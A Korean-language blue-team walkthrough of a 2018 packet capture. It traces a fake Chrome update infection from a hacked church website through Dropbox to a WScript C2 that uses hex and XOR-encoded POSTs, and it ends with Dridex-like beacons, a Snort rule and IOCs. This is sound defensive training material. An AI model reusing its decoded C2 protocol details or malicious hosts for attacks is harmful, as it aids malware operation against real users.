20:28:01.640   162.125.9.6   443        uc7cfbc6f640f168ed8036c6d5bb.dl.dropboxusercontent.com   TLSv12   true
```

다운로드 서버에서 얼마나 받았는지:

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_ALERTS id_resp_h=162.125.9.6
| eval t=strftime(ts,"%H:%M:%S")
| table t id_resp_h id_resp_p duration orig_bytes resp_bytes conn_state
```

```text
t         id_resp_h    id_resp_p  duration  orig_bytes  resp_bytes  conn_state
20:28:01  162.125.9.6  443        ...       1237        23469       SF
```

**결과 읽기:**

- 20:27:57 가짜 페이지 + 3초 타이머 → **20:28:00 www.dropbox.com** → **20:28:01 `*.dl.dropboxusercontent.com`**(Dropbox의 파일 서버 — `dl=1` 링크가 그쪽으로 보내요). 스크립트와 시간이 정확히 맞아요.
- TLS 오버헤드를 포함해서 **약 23 KB**를 받았어요. `.js` 파일답게 작아요. 내용과 해시는 **보이지 않아요**. 호스트 담당자가 `C:\Users\lloyd.maxwell\Downloads\Chrome_72.3.22.js`를 수집해야 해요(4단계에서 이 경로를 확인해요).

**티켓 기록:**

```text
[0020 261124, Sung] – Investigating HTTP referer chain from www.stmarybahrain.com to fake Chrome update page – Found – Further Analysis Required
[0034 261124, Sung] – Looking for download of the fake update file by 172.16.2.169 – Found – Further Analysis Required
```

---

## 4단계 — 스크립트 실행: WScript C2 { #wscript }

### 4-1. 새 User-Agent가 나타나요 { #ua }

**목적:** 내려받은 파일은 **실행**되기 전까지 감염이 아니에요. 스크립트 엔진은 Chrome의 User-Agent를 보내지 않아요. 새로운 User-Agent를 찾아요.

```spl
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_ALERTS
| eval t=strftime(ts,"%H:%M:%S")
| stats count min(t) as first values(host) as hosts by user_agent
| sort first
```

- User-Agent마다 한 줄: 요청 개수, 처음 나온 시간, 어떤 호스트로 갔는지.

```text
user_agent                                                                                  count  first     hosts
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 ... Chrome/67.0.3396.99 ...     64     20:27:53  lw2e.sineadhollywoodnutt.com track.positiverefreshment.org www.stmarybahrain.com
Microsoft-CryptoAPI/6.1                                                                     3      20:28:00  crl.microsoft.com ocsp.digicert.com
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR ...)   3      20:28:47  bb17eb22.login3.kimbrelelectric.com
Microsoft BITS/7.5                                                                          64     20:33:54  redirector.gvt1.com r2---sn-... r4---sn-...
```

**결과 읽기:** 윈도우 7에서 `Trident/7.0`(IE11 엔진)과 함께 나오는 `MSIE 7.0`은 **윈도우 스크립트용 HTTP 객체의 기본 User-Agent**예요(`wscript.exe`가 부르는 `MSXML2.XMLHTTP`/`WinHttp`). **Dropbox 다운로드 46초 뒤**에 처음 나오고, 호스트 하나에만 써요. → 사용자가 `Chrome_72.3.22.js`를 열었어요.

### 4-2. POST 세 개 { #posts }

```spl
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_ALERTS host="bb17eb22.login3.kimbrelelectric.com"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| table t id_orig_p id_resp_h id_resp_p method uri status_code request_body_len response_body_len resp_mime_types
```

- `request_body_len` — PC가 POST 본문으로 **보낸** 바이트. `response_body_len` — 서버가 돌려준 바이트.

```text
t              id_orig_p  id_resp_h      id_resp_p  method  uri         status  request_body_len  response_body_len  resp_mime_types
20:28:47.389   49440      93.95.100.138  80         POST    /blank.gif  200     72                11866              text/plain
20:28:48.186   49440      93.95.100.138  80         POST    /blank.gif  200     2644              348868             text/plain
20:28:50.047   49440      93.95.100.138  80         POST    /blank.gif  200     256               0                  -
```

바로 앞의 DNS 질의:

```spl
index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_ALERTS query="*kimbrelelectric.com"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| table t query answers
```

```text
t              query                                  answers
20:28:46.647   bb17eb22.login3.kimbrelelectric.com    93.95.100.138
```

**결과 읽기:**

- **`/blank.gif`로 POST.** GIF는 *내려받는* 것이지 이미지에 데이터를 POST하지 않아요. 이름은 위장이에요.
- POST 세 개가 **연결 하나**(같은 출발 포트 49440)에서 **3초 안에** 일어나요. 작게(72 B) → 크게(2,644 B) → 작게(256 B). 응답은 11.9 KB → **349 KB** → 없음. 사람이 아니라 스크립트가 서버와 대화하는 모습이에요.
- **349 KB를 받음** — 어떤 명령보다 훨씬 커요. 무언가가 **전달**됐어요(4-4).
- `93.95.100.138`과 가짜 페이지의 `93.95.100.178`은 **같은 /24 대역**이에요. 같은 운영자예요.
- 하위 도메인 `bb17eb22.login3.`은 만들어 낸 이름(16진수 8글자)처럼 보여요. 피해자나 캠페인마다 새 이름을 쓰는 거예요.

### 4-3. POST 본문 읽기 (Arkime → CyberChef) { #decode-posts }

Zeek는 크기만 기록해요. 본문은 Arkime에 있어요.

```text
tags == 20180630_SORTING_ALERTS && host.http == bb17eb22.login3.kimbrelelectric.com
```

세션을 펼치면 요청 헤더가 보여요.

```text
POST /blank.gif HTTP/1.1
Accept: */*
Accept-Language: en-us
Age: 464b8967d47e14d7
Content-Type: application/x-www-form-urlencoded
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; ...)
Host: bb17eb22.login3.kimbrelelectric.com
```

- **요청에 `Age:`가 있는 건 이상해요.** `Age`는 *캐시 서버가 응답에* 붙이는 헤더예요. 여기서는 16진수 16글자 값이 세 POST에서 모두 같아요. **피해자/세션 ID**일 가능성이 높아요.
- `UA-CPU: AMD64` — 64비트 윈도우의 HTTP 객체가 붙이는 헤더예요. 브라우저가 아니라 스크립트라는 또 다른 신호예요.

본문 세 개:

```text
a=075d6d603e653c386b3969687b6c60686d6a7b6f606c686e6d6e646d686f6b646e6a7b
b=8cdbebe6eeebecfdeae698fee89afeee988ea8bea9a8feee98b7b7b4a2bff5b6baa3acbeb7b7feee98...   (16진수 2,642글자)
c=d6c8f8f5fdf8ffeef9f58bedfb89edfd8b9dbbadbabbedfd8b848487918cb6f9e6858990edfd8b89b8...
```

**알아보고 푸는 방법:**

1. `a=`, `b=`, `c=` 뒤에 **`0–9 a–f`**만 나와요 → **16진수(hex)** 글자예요. hex를 바이트로 바꿔도 알아볼 수 없어요 → **한 겹이 더** 있어요.
2. **1바이트 XOR**을 시도해요(키가 256개뿐이에요). 맞는 키는 **crib**(결과에 있을 것 같은 글자)으로 골라요. 이건 폼 전송(`Content-Type: application/x-www-form-urlencoded`)이라서 원문은 `이름=값&이름=값` 모양일 거예요. crib은 **`&1=`**을 써요.

**CyberChef 레시피** (본문마다 따로, `b=` **뒤의** hex만 복사):

1. **From Hex**.
2. **XOR Brute Force** — Key length `1`, Crib `&1=`. 읽을 수 있는 글자가 나온 줄의 키를 적어요.
3. 2단계를 **XOR**로 바꿔요 — 그 키, **HEX**.
4. **URL Decode** (`%5C`를 `\`로, `%3A`를 `:`로 바꿔요).

| 본문 | 키 | 풀어 낸 내용 (앞의 몇 글자는 쓰레기 값 — 무시) |
|---|---|---|
| `a=` (hex 72글자) | `5d` | `0=c8ae6d45&1=507&2=1530390526937&` |
| `b=` (hex 2,642글자) | `db` | 아래 참고 |
| `c=` (hex 254글자) | `c8` | `0=507&1=C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe&2=0&3=0&4=1&...&9=1530390529896&` |

`b=` 본문을 푼 결과(프로세스 목록은 줄임):

```text
0=507
&1=C:\Users\lloyd.maxwell\Downloads\Chrome_72.3.22.js
&2=AMD64
&3=CONSERVATOR-PC
&4=lloyd.maxwell
&5=6
&6=Windows_NT
&7=FABULOUSDUKES
&8=System manufacturer|
&9=System Product Name|
&10=031913 - 20130319;System Serial Number|
&11=Windows Defender|
&13=90:E2:BA:2D:C6:D6|
&14=Enhanced (101- or 102-key)|...
&16=1024x768|
&17=System Idle Process|System|smss.exe|...|explorer.exe|...|chrome.exe|chrome.exe|...|wscript.exe|mscorsvw.exe|...|WmiPrvSE.exe|
&18=2596
&20=1530390528027
```

**결과 읽기:**

- **`a=`** — "안녕": ID(`c8ae6d45`), 숫자 `507`(`b=`와 `c=`에도 반복 — 캠페인/빌드 번호로 보임), 밀리초 시간(`1530390526937` = 20:28:46.937 UTC — PC 시계가 캡처와 맞아요).
- **`b=`** — **PC 프로필**: 스크립트를 실행한 위치(**`Downloads\Chrome_72.3.22.js`** — 사용자가 Dropbox 파일을 실행했다는 증거), CPU, **호스트 이름, 사용자, 도메인**, 하드웨어와 BIOS 문자열, **백신 제품(`Windows Defender`)**, MAC 주소, 키보드, 마우스, 화면 크기, **전체 프로세스 목록**. 목록에 `wscript.exe`가 있어요 — 스크립트 엔진이 실행 중이에요. 공격자는 이걸로 진짜 회사 PC인지 샌드박스인지 판단해요(화면 1024x768, "System manufacturer" 같은 기본 문자열 등).
- **`b=`의 응답 = 349 KB.** PC가 검사를 통과해서 페이로드를 받았어요.
- **`c=`** — 결과 보고: 페이로드를 **`C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe`**로 저장하고 실행했어요(`LLOYD~1.MAX`는 `lloyd.maxwell`의 8.3 짧은 이름). 응답이 비어 있어요 — 더 할 일이 없다는 뜻이에요.

!!! question "질문: 왜 본문마다 키가 다른가요?"
    스크립트가 메시지마다 새 1바이트 키를 골라요(`5d`, `db`, `c8`). 풀어 낸 본문의 앞 한두 바이트는 아마 서버가 키를 알아내는 부분이라서 쓰레기처럼 보여요. 분석하는 사람에게는 상관없어요. **crib이 매번 키를 찾아 줘요.** 변하지 않는 것은 **형식**이에요 — `a=`/`b=`/`c=` + hex + 1바이트 XOR. 탐지는 이 형식을 노려야 해요.

!!! question "질문: `13=`의 MAC(90:E2:BA:2D:C6:D6)이 캡처의 MAC(00:13:d4:1f:a2:5e)과 달라요"
    `13=`은 스크립트가 윈도우에서 읽은 값이에요(`|`로 끝나는 목록이라 어댑터가 여러 개일 수 있어요). 캡처의 MAC은 실제 선 위의 값이에요. 가상 어댑터나 두 번째 어댑터, 또는 실습용으로 다시 쓴 캡처 때문일 수 있어요. 네트워크 기준 사실은 **선 위의 MAC**이에요. 두 값을 모두 호스트 담당자에게 넘겨요.

### 4-4. 349 KB 응답 — 페이로드 { #payload }

**Splunk** (Zeek는 HTTP 본문을 모두 파일로 보고 해시를 구해요):

```spl
index=zeek sourcetype=zeek:files pcap_case=20180630_SORTING_ALERTS tx_hosts="93.95.100.138"
| eval t=strftime(ts,"%H:%M:%S")
| table t tx_hosts rx_hosts mime_type seen_bytes md5 sha1
```

- `tx_hosts` = 파일을 보낸 쪽, `rx_hosts` = 받은 쪽, `mime_type` = 내용으로 추측한 형식, `seen_bytes` = 크기.

```text
t         tx_hosts       rx_hosts      mime_type    seen_bytes  md5
20:28:47  93.95.100.138  172.16.2.169  text/plain   11866       0e8a4bb8758c4ca91a3ee52395617ef9
20:28:48  93.95.100.138  172.16.2.169  text/plain   348868      dd83bbcc7dd4184b352f9882c3fe8408
```

**Arkime:** 348,868 바이트 응답도 **hex 글자**예요(`ca02a05b5aed8b82...`). 그래서 실제 데이터 크기는 절반인 **174,434 바이트**예요.

**결과 읽기:**

- 페이로드가 **EXE 모양으로 오지 않아요** — `MZ`도 없고 `application/x-dosexec`도 아니에요. 그래서 "EXE 다운로드 찾기" 검색에는 안 걸려요. 스크립트가 PC에서 풀어서 `Chrome_72.3.22.exe`로 써요(본문 `c=`).
- 위 MD5는 **인코딩된** 응답의 해시예요. 디스크의 `.exe`와 **맞지 않아요**. 호스트 담당자가 `%TEMP%`의 파일 해시를 구해야 해요.

!!! note "더 들어가 보기(선택) — 안에는 EXE가 있어요"
    풀어 낸 174 KB에 1바이트 XOR 무차별 대입을 해도 아무것도 안 나와요. 하지만 같은 바이트 덩어리가 **90바이트마다** 반복돼요. 0 바이트가 많은 파일(윈도우 EXE는 0이 많아요)에 **반복 XOR 키**를 썼다는 신호예요. 90개 위치마다 가장 많이 나온 바이트를 키로 쓰면 `MZ ... This program cannot be run in DOS mode`로 시작하는 32비트 윈도우 EXE가 나와요. 긴 키를 되찾는 건 악성코드 분석 일이지 티켓 일이 아니에요. 네트워크 결론은 같아요: **암호화된 윈도우 EXE가 전달됐어요.** 이렇게 다시 만든 파일의 해시는 티켓에 넣지 마세요. 진짜 파일은 호스트에서 받아요.

**티켓 기록:**

```text
[0041 261124, Sung] – Investigating HTTP POSTs from 172.16.2.169 to kimbrelelectric.com (WScript C2) – Found – Further Analysis Required
[0058 261124, Sung] – Decoding C2 POST bodies in CyberChef – Found
```

---

## 5단계 — 페이로드 다음: 대답하지 않는 C2 주소 두 개 { #followon }

**목적:** PC에 새 프로그램이 생기면 보통 **자기** 서버와 통신을 시작해요. **20:28:50(마지막 POST) 이후에 새로 나온 외부 목적지**, 특히 **DNS 이름이 없는** 곳을 찾아요.

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_ALERTS id_orig_h=172.16.2.169 ts>1530390530
| where NOT cidrmatch("172.16.0.0/12", id_resp_h) AND NOT cidrmatch("224.0.0.0/4", id_resp_h)
| stats min(ts) as first max(ts) as last count values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by id_resp_h id_resp_p
| eval first=strftime(first,"%H:%M:%S"), last=strftime(last,"%H:%M:%S")
| sort first
```

- 1줄 `ts>1530390530` — 2018-06-30 20:28:50 UTC **이후에 시작한** 연결만 봐요(epoch 초로 적어요). 아무 시간이나 숫자로 바꾸려면 `| makeresults | eval x=strptime("2018-06-30 20:28:50 +0000","%Y-%m-%d %H:%M:%S %z")`를 실행하고 `x`를 읽어요(`makeresults`는 계산용 빈 줄 하나를 만들고, `%z` + `+0000`은 UTC 시간이라는 뜻이에요).
- 2줄 `cidrmatch("172.16.0.0/12", id_resp_h)` — IP가 그 대역 안이면 참이에요. `NOT ... AND NOT ...`으로 내부 주소와 멀티캐스트를 빼요.
- 3줄 — 목적지 IP·포트마다 한 줄: 처음/마지막 시간, 연결 개수, **`conn_state`** 값, 양방향 바이트.

```text
id_resp_h         id_resp_p  first     last      count  states  sent   received
46.105.131.66     443        20:29:00  20:59:05  10     REJ     0      0
107.170.231.118   4143       20:31:14  20:53:42  8      S0      0      0
... (열려 있는 CNN 탭의 CDN / 광고 서버, 모두 데이터가 있는 SF — 20:29–20:36)
172.217.10.142    80         20:33:53  ...       1      SF      ...    ...      (redirector.gvt1.com — Chrome 구성 요소 업데이트)
...
23.215.99.27      80         20:43:13  20:45:22  2      SF      454    1888     (crl.microsoft.com)
```

**여기서 `conn_state`의 뜻:**

| conn_state | 일어난 일 | 이번 사례 |
|---|---|---|
| `SF` | 정상 시작·정상 종료, 양쪽 데이터 있음 | 웹 트래픽 |
| `REJ` | PC가 SYN을 보내고 서버가 **RST**로 답함 — "그 포트에 듣는 프로그램이 없음" | 46.105.131.66:443 |
| `S0` | PC가 SYN을 보냈는데 **아무 대답도 없음** | 107.170.231.118:4143 |

PC가 이 IP들을 DNS로 찾았나요?

```spl
index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_ALERTS answers IN ("46.105.131.66","107.170.231.118")
| table ts query answers
```

**결과: 한 줄도 없어요** — 주소가 **프로그램 안에 박혀 있었어요**.

시간 간격:

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_ALERTS id_resp_h IN ("46.105.131.66","107.170.231.118")
| sort ts
| delta ts as gap
| eval t=strftime(ts,"%H:%M:%S"), gap=round(gap,1)
| table t id_orig_p id_resp_h id_resp_p conn_state gap
```

- `delta ts as gap` — 바로 앞 줄과의 시간 차이(초)예요.

```text
t         id_orig_p  id_resp_h         id_resp_p  conn_state  gap
20:29:00  49447      46.105.131.66     443        REJ
20:29:01  49448      46.105.131.66     443        REJ         1.4
20:31:14  49471      107.170.231.118   4143       S0          132.4
20:31:35  49472      107.170.231.118   4143       S0          21.0
20:36:10  49491      46.105.131.66     443        REJ         275.0
20:36:11  49492      46.105.131.66     443        REJ         1.4
20:38:30  49493      107.170.231.118   4143       S0          138.4
20:38:51  49494      107.170.231.118   4143       S0          21.0
20:43:37  49503      46.105.131.66     443        REJ         286.0
20:43:38  49504      46.105.131.66     443        REJ         1.4
20:45:53  49506      107.170.231.118   4143       S0          134.4
20:46:14  49507      107.170.231.118   4143       S0          21.0
20:51:14  49508      46.105.131.66     443        REJ         300.0
20:51:15  49509      46.105.131.66     443        REJ         1.4
20:53:21  49510      107.170.231.118   4143       S0          125.4
20:53:42  49511      107.170.231.118   4143       S0          21.0
20:59:04  49513      46.105.131.66     443        REJ         322.1
20:59:05  49514      46.105.131.66     443        REJ         1.4
```

**결과 읽기:**

- 첫 시도는 **페이로드를 저장하고 10초 뒤**예요(20:28:50 → 20:29:00). 웹 브라우징으로는 이 두 IP를 설명할 수 없어요.
- **DNS 없이 IP만**, 흔하지 않은 포트 **4143**, 일정한 박자: IP 1 두 번 → 약 2분 → IP 2 두 번 → 약 5분 → 반복. 한 바퀴가 약 **7.5분**이고 캡처가 끝날 때까지 계속돼요. 사람이 아니라 **C2 목록을 차례로 시도하는 프로그램**이에요.
- **한 번도 연결되지 않았어요.** 그래서 **C2 데이터, 명령, 추가 다운로드가 없어요**. 이 트래픽이 기록될 때 서버가 이미 꺼졌거나 막혀 있었어요.
- 가짜 업데이트 감염의 페이로드가 443과 이상한 높은 포트로 IP:포트 C2를 하드코딩해서 쓰는 건, 2018년 **Dridex**(뱅킹 트로이목마)의 동작 방식이에요. 성공한 세션도, 해시도, 시그니처도 없으니 **"Dridex와 비슷함(확인 안 됨)"**으로 둬요.

!!! question "질문: 아무것도 연결되지 않았으면 PC는 여전히 감염된 건가요?"
    네. 네트워크는 **PC 안의** 프로그램이 몇 분마다 C2에 닿으려고 하는 모습을 보여 줘요. C2가 죽어 있다는 건 **오늘만** PC를 지켜 줄 뿐이에요. 악성코드에 다른 주소가 더 있을 수도 있고, 나중에 받을 수도 있고, 서버가 다시 살아날 수도 있어요. 티켓에는 "감염됨, 후속 C2는 작동 안 함"이라고 적어요. 호스트는 정리가 필요하고, 사용자의 비밀번호는 노출된 것으로 봐야 해요(뱅킹 트로이목마는 비밀번호를 훔쳐요).

!!! question "질문: 호스트 담당자는 무엇을 찾으면 되나요?"
    이 트래픽에서 나온 것:

    - `C:\Users\lloyd.maxwell\Downloads\Chrome_72.3.22.js`와 `C:\Users\lloyd.maxwell\AppData\Local\Temp\Chrome_72.3.22.exe` — 수집하고 해시 구하기.
    - 20:28:46 UTC쯤 `explorer.exe`에서 시작된 `wscript.exe`(Event 4688 / Sysmon 1).
    - EXE가 남긴 것(자기를 옮겼을 수 있음) — Run 키, 예약 작업, `%APPDATA%`의 새 DLL.
    - 20:27:53–20:27:57의 Chrome 기록: `www.stmarybahrain.com`과 가짜 페이지.

**티켓 기록:**

```text
[0109 261124, Sung] – Looking for new external connections by 172.16.2.169 after the payload download – Found
```

---

## 6단계 — 간단한 Snort 룰 하나 { #snort }

네트워크에서 보이는 가장 구체적인 것은 C2 호스트예요. 단순한 content 일치 하나로 만들어요.

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"SocGholish C2 kimbrelelectric.com - Sung"; content:"kimbrelelectric.com"; nocase; sid:1000041; rev:1;)
```

- `alert tcp $HOME_NET any -> $EXTERNAL_NET 80` — 내부의 아무 포트에서 외부 80번 포트(HTTP)로 가는 TCP.
- `msg:"..."` — 경보 문구, 끝에 작성자 이름.
- `content:"kimbrelelectric.com"; nocase;` — 패킷에 이 글자가 있으면(대소문자 무시). 모든 POST의 `Host:` 헤더에 있어요.
- `sid:1000041; rev:1;` — 직접 만든 룰 번호(1000000 이상)와 버전.

**예상: 경보 3개** — 포트 49440의 POST 패킷 세 개. 이 이름의 DNS 질의는 UDP라서 이 TCP 룰에는 안 걸려요.

**테스트** (초보자용 전체 단계: [Night Dew 두 번째 분석 6-3](night-dew-arkime-splunk-netlogon-bruteforce.md#snort-test)):

```bash
sudo snort -T -c /etc/snort/snort.conf 2>&1 | tail -5
snort-test 20180630_SORTING_ALERTS
```

- `-T` — 문법만 확인해요. `Snort successfully validated the configuration!`이 나와야 해요.
- `snort-test <케이스>` — pcapbox 도우미: `/data/pcap/<케이스>.pcap`에 룰을 돌리고 룰마다 경보 개수를 세요.

```text
     3 [1:1000041:1] SocGholish C2 kimbrelelectric.com - Sung
```

시간까지 보려면 직접 실행해요.

```bash
sudo snort -c /etc/snort/snort.conf -r /data/pcap/20180630_SORTING_ALERTS.pcap -A console -q -k none -U -y -l /tmp/snortlog
```

```text
06/30/18-20:28:47.389809  [**] [1:1000041:1] SocGholish C2 kimbrelelectric.com - Sung [**] [Priority: 0] {TCP} 172.16.2.169:49440 -> 93.95.100.138:80
06/30/18-20:28:48.186564  [**] [1:1000041:1] SocGholish C2 kimbrelelectric.com - Sung [**] [Priority: 0] {TCP} 172.16.2.169:49440 -> 93.95.100.138:80
06/30/18-20:28:50.047505  [**] [1:1000041:1] SocGholish C2 kimbrelelectric.com - Sung [**] [Priority: 0] {TCP} 172.16.2.169:49440 -> 93.95.100.138:80
```

Zeek `http.log`와 시간·포트가 같아요 — 도구끼리 결과가 맞아요.

!!! note "도메인 룰은 가장 간단하지만 가장 강하지는 않아요"
    공격자는 내일 도메인을 바꿀 수 있어요. 나중에 써 볼 더 강한 아이디어(이번 티켓에는 필요 없음): `/blank.gif`로 가는 POST에 `a=`/`b=`/`c=`와 hex만 있는 것, **요청**에 있는 `Age:` 헤더, 처음 보는 도메인으로 가는 `MSIE 7.0` + `UA-CPU` User-Agent.

---

## 타임라인 (2018-06-30, UTC) { #timeline }

| 시간 | 이벤트 |
|---|---|
| 20:27:15 | 캡처 시작 |
| 20:27:17–18 | CONSERVATOR-PC와 **lloyd.maxwell** 로그온(Kerberos) |
| 20:27:52 | `www.cnn.com` 열림(잡음 — 광고와 CDN이 따라옴) |
| 20:27:53 | `www.stmarybahrain[.]com/new/` 열림(Referer 없음) — **해킹된 사이트** |
| 20:27:54 | 숨겨진 코드가 들어 있는 사이트 스크립트 로드(`.js` 7개) |
| 20:27:55–56 | `track.positiverefreshment[.]org/s_code.js` 3번 — 지문 검사, TDS가 PC 통과시킴 |
| 20:27:57 | `lw2e.sineadhollywoodnutt[.]com`의 가짜 **"Update Chrome"** 페이지 |
| 20:28:00–01 | Dropbox에서 자동 다운로드: `Chrome_72.3.22.js` (HTTPS) |
| 20:28:46 | DNS `bb17eb22.login3.kimbrelelectric[.]com` — **사용자가 .js 실행(wscript.exe)** |
| 20:28:47 | POST `a=` — 인사 |
| 20:28:48 | POST `b=` — PC 프로필, 응답 **349 KB 암호화 페이로드** |
| 20:28:50 | POST `c=` — 페이로드를 `%TEMP%\Chrome_72.3.22.exe`로 저장·실행 |
| 20:29:00 | 첫 후속 C2 시도 46.105.131.66:443 (거절) |
| 20:31:14 | 첫 시도 107.170.231.118:4143 (대답 없음) |
| 20:29–20:59 | 약 7.5분마다 반복 — 한 번도 연결 안 됨 |
| 20:33–20:35 | BITS로 Chrome 구성 요소 업데이트(정상) |
| 20:59:06 | 캡처 끝. PC는 계속 시도 중 |

---

## IOC { #iocs }

| 종류 | 값 | 설명 |
|---|---|---|
| Domain / IP | `www.stmarybahrain[.]com` — 66.226.144.232 | 해킹된 사이트. `/new/` 아래 `.js` 파일 7개에 스크립트 심어짐 |
| Domain / IP | `track.positiverefreshment[.]org` — 185.244.149.74 | TDS, `/s_code.js?cid=220` |
| Domain / IP | `lw2e.sineadhollywoodnutt[.]com` — 93.95.100.178 | 가짜 "Update Chrome" 페이지, `/topics/index.php`, `/chromefiles/` |
| URL | `hxxps://www.dropbox[.]com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1` | 다운로드 링크(Dropbox 악용) |
| Domain / IP | `bb17eb22.login3.kimbrelelectric[.]com` — 93.95.100.138 | WScript C2, POST `/blank.gif`, 페이로드 전달 |
| HTTP 헤더 | `Age: 464b8967d47e14d7` (요청에 있음) | 스크립트가 보낸 피해자/세션 ID |
| IP:port | 46.105.131.66:443, 107.170.231.118:4143 | 후속 C2 시도(DNS 없음) |
| 파일 | `C:\Users\<user>\Downloads\Chrome_72.3.22.js` | 가짜 업데이트 스크립트(해시: 호스트에서) |
| 파일 | `C:\Users\<user>\AppData\Local\Temp\Chrome_72.3.22.exe` | 페이로드(해시: 호스트에서) |
| MD5 | `dd83bbcc7dd4184b352f9882c3fe8408` | 선 위에서 본 348,868바이트 **인코딩된** C2 응답 — EXE 해시 아님 |

---

## 침해사고 티켓 { #ticket }

핵심 발견만, 짧은 문장, 쉬운 영어로 썼어요. 작업자 이름, 작업 로그 시간, 티켓 링크는 바꿔야 하는 자리 표시예요.

[:material-download: 티켓 txt 파일 내려받기](files/180630_CONSERVATOR-PC_ticket.txt){ .md-button }

```text
--8<-- "docs-ko/blueteam/investigations/files/180630_CONSERVATOR-PC_ticket.txt"
```

보내기 전에: 작업 로그 시간과 이름을 본인 것으로 바꾸고, 팀에서 기록한다면 `ingest.log`의 SHA256을 넣어요.

---

## 복사해서 쓰는 쿼리 { #query-sheet }

`<case>`는 케이스 이름으로 바꿔요. 실제 네트워크에서는 `tags`/`pcap_case` 조건을 빼요.

**Splunk (Zeek)**

```spl
index=zeek sourcetype=zeek:conn | stats count by pcap_case
index=zeek sourcetype=zeek:conn pcap_case=<case> | stats min(ts) as first max(ts) as last count as sessions | eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
index=zeek sourcetype=zeek:conn pcap_case=<case> | stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received by id_orig_h | sort - sessions
index=zeek sourcetype=zeek:kerberos pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | sort ts | table t id_orig_h request_type client service success error_msg
index=zeek sourcetype=zeek:dns pcap_case=<case> qtype_name=SOA | eval t=strftime(ts,"%H:%M:%S") | table t id_orig_h id_resp_h query qtype_name rcode_name
index=zeek sourcetype=zeek:http pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | stats count min(t) as first values(method) as methods values(user_agent) as user_agents by host | sort first
index=zeek sourcetype=zeek:http pcap_case=<case> host IN ("<host1>","<host2>") | eval t=strftime(ts,"%H:%M:%S.%3N") | dedup host uri | sort ts | table t host uri referrer status_code resp_mime_types response_body_len
index=zeek sourcetype=zeek:http pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | stats count min(t) as first values(host) as hosts by user_agent | sort first
index=zeek sourcetype=zeek:http pcap_case=<case> host="<c2 host>" | eval t=strftime(ts,"%H:%M:%S.%3N") | table t id_orig_p id_resp_h id_resp_p method uri status_code request_body_len response_body_len resp_mime_types
index=zeek sourcetype=zeek:ssl pcap_case=<case> server_name="*dropbox*" | eval t=strftime(ts,"%H:%M:%S.%3N") | table t id_resp_h id_resp_p server_name version established
index=zeek sourcetype=zeek:files pcap_case=<case> tx_hosts="<server ip>" | eval t=strftime(ts,"%H:%M:%S") | table t tx_hosts rx_hosts mime_type seen_bytes md5 sha1
index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=<host ip> ts><epoch> | where NOT cidrmatch("172.16.0.0/12", id_resp_h) AND NOT cidrmatch("224.0.0.0/4", id_resp_h) | stats min(ts) as first max(ts) as last count values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by id_resp_h id_resp_p | eval first=strftime(first,"%H:%M:%S"), last=strftime(last,"%H:%M:%S") | sort first
index=zeek sourcetype=zeek:dns pcap_case=<case> answers IN ("<ip1>","<ip2>") | table ts query answers
index=zeek sourcetype=zeek:conn pcap_case=<case> id_resp_h IN ("<ip1>","<ip2>") | sort ts | delta ts as gap | eval t=strftime(ts,"%H:%M:%S"), gap=round(gap,1) | table t id_orig_p id_resp_h id_resp_p conn_state gap
```

**Arkime**

```text
tags == <case>
tags == <case> && ip.src == 172.16.2.169 && port.dst == 138
tags == <case> && host.http == www.stmarybahrain.com && http.uri == *.js*
tags == <case> && host.http == track.positiverefreshment.org
tags == <case> && host.http == lw2e.sineadhollywoodnutt.com && http.uri == *index.php*
tags == <case> && host.http == bb17eb22.login3.kimbrelelectric.com
tags == <case> && ip.dst == [46.105.131.66, 107.170.231.118]
```

**CyberChef**

```text
숨긴 JS 문자열:   Find / Replace (Regex (.)(.) → $2, Global)  →  Reverse (Character)
C2 POST 본문:     From Hex  →  XOR Brute Force (Key length 1, Crib &1=)  →  XOR (Key <hex>)  →  URL Decode
```

---

## 배운 점 { #lessons }

1. **바쁜 웹 브라우징은 짧은 공격을 숨겨요.** 목적지 185곳 중 감염은 1분 동안의 호스트 4개예요. HTTP를 호스트별로 묶고, 아는 정상(BITS, CryptoAPI, CDN)부터 지워요.
2. **Referer가 곧 사슬이에요.** 악성 요청이 모두 교회 사이트의 `/new/`를 가리켰어요. 다른 탭이 아니라 그 사이트가 시작했다는 증거예요.
3. **새 User-Agent = 새 프로그램.** 다운로드 46초 뒤 Chrome → `MSIE 7.0` + `UA-CPU`로 바뀌면 사용자가 파일을 실행한 거예요.
4. **"누가/언제/얼마나"는 Splunk, "정확히 무엇"은 Arkime.** Zeek는 크기와 해시를 줬고, 리다이렉트 URL, 다운로드 링크, 프로필 정보는 본문 안에만 있었어요.
5. **간단한 속임수에는 간단한 레시피.** "두 글자마다 하나, 뒤집기"와 "hex + 1바이트 XOR"은 2단계, 4단계 CyberChef 레시피로 풀려요. **형식**에서 고른 crib(폼 전송의 `&1=`)이 모든 키를 찾았어요.
